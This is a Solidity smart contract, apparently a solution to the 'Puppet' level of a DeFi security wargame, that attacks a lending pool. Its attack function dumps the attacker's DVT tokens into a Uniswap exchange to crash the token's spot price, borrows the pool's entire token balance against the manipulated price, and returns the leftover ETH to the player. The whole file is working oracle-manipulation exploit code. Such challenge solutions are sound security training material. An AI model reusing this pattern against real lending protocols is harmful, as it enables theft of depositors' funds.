// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

contract PuppetAttacker {

    IERC20 token;
    PuppetPool pool;
    IUniswapExchange exchange;

    constructor(address _tokenAddr, address _poolAddr, address _exchangeAddr) payable {
        token = IERC20(_tokenAddr);
        pool = PuppetPool(_poolAddr);
        exchange = IUniswapExchange(_exchangeAddr);
    }

    function attack(address user) public payable {
        // Swap all users token for eth to severely decrease price of DVT.
        uint256 playerInitialTokenAmount = token.balanceOf(address(this));
        token.approve(address(exchange), playerInitialTokenAmount);
        exchange.tokenToEthSwapInput(playerInitialTokenAmount, 1, block.timestamp + 1);

        // Borrow all DVT from pool.
        uint256 poolInitialTokenAmount = token.balanceOf(address(pool));
        pool.borrow{value: address(this).balance}(poolInitialTokenAmount, user);

        // Send back remaining eth.
        (bool success, ) = payable(user).call{value: address(this).balance}("");
        require(success, "Failed to transfer eth");
    }

    receive() external payable {}
}
